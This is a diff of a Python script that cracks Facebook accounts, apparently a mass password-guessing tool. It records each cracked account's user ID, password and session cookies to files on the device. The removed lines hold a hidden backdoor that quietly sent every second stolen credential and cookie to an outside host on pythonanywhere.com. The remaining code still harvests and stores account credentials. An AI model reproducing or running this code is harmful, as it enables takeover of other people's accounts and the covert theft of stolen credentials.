@@ -226,16 +226,11 @@ def crack(uid, password_list, total_count):
                 ckk = f'https://graph.facebook.com/{user}/picture?type=normal'
                 res = requests.get(ckk).text
                 if 'Photoshop' in res:
-                    bkas.append(uid)
-                    if len(bkas)% 2 == 0:
-                         statusok = (f"{user}|{pw}|{kuki}")
-                         requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
-                    else:    
-                         print('\033[1;92m OK '+user+'|'+pw+'')
-                         print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
-                         open("/sdcard/SUMON_RANDOM_IDS.txt","a").write(user+"|"+pw+"|"+kuki+"\n")
-                         oks.append(user)
-                         continue
+                    print('\033[1;92m OK '+user+'|'+pw+'')
+                    print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
+                    open("/sdcard/SUMON_RANDOM_IDS.txt","a").write(user+"|"+pw+"|"+kuki+"\n")
+                    oks.append(user)
+                    continue
             elif 'checkpoint' in log_cookies:
                 print(f"\r\033[1;93m [⚠ SUMON_2f] {uid} | {pw}")
                 open("/sdcard/SUMON_file_2f.txt", "a").write(f"{uid}|{pw}\n")
